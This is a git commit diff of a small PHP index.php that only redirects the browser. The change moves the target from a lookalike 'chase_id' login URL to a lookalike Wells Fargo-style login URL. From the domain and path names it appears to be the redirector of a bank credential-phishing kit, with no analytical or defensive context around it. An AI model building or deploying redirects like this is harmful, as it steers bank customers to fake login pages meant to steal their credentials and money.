dafdf1c421376ae4931ecf76b9efb63c4cf4aba3
Darkslim104 <100035145+Darkslim104@users.noreply.github.com>
2022-03-24 23:00:21 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://ds-recover.com/verify/Login/login?chase_id=&country=&iso="); 
+header("Location: https://wls-vrfy.com/wllsfrgo/login?wells_id=5b030d1c9beeda31ad36b2cf0&country=&iso="); 
   
 exit; 
 ?> 
